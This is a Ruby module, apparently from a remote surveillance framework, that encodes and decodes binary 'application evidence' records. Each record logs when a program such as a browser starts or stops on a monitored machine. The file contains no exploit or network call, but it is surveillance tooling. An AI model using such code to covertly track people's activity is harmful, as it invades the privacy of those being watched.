require 'rcs-common/evidence/common'

module RCS

module ApplicationEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    program = ["Safari", "Opera", "Firefox"].sample.to_utf16le_binary_null
    action = ['START', 'STOP'].sample.to_utf16le_binary_null
    info = ['', 'ciao miao bau'].sample.to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write action
    content.write info
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new
    until stream.eof?
      tm = stream.read 36
      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      @info[:program] = ''
      @info[:action] = ''
      @info[:info] = ''
      
      program = stream.read_utf16le_string
      @info[:program] = program.utf16le_to_utf8 unless program.nil?
      action = stream.read_utf16le_string
      @info[:action] = action.utf16le_to_utf8 unless action.nil?
      info = stream.read_utf16le_string
      @info[:info] = info.utf16le_to_utf8 unless info.nil?

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed evidence (missing delimiter)") unless delim == ELEM_DELIMITER

      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end
    
    return evidences
  end
end

end # ::RCS